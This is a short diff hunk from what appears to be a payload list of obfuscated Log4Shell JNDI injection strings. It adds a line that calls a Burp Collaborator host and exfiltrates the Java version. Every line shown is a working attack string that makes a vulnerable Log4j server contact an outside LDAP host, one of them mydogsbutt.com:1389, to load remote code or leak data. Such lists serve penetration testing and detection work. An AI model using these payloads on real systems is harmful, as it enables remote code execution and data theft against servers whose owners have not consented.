@@ -99,4 +99,5 @@ j${sys:k5:-nD}${lower:i${web:k5:-:}}
 jn${date:}di${date:':'}
 jn${env::-}di:
 ${jnd${123%25ff:-${123%25ff:-i:}}ldap://mydogsbutt.com:1389/o}
+127.0.0.1/${jndi:ldap://3y2i0ndknzu3ggcfrukjvhviy945su.burpcollaborator.net/${java:version}}
 ```
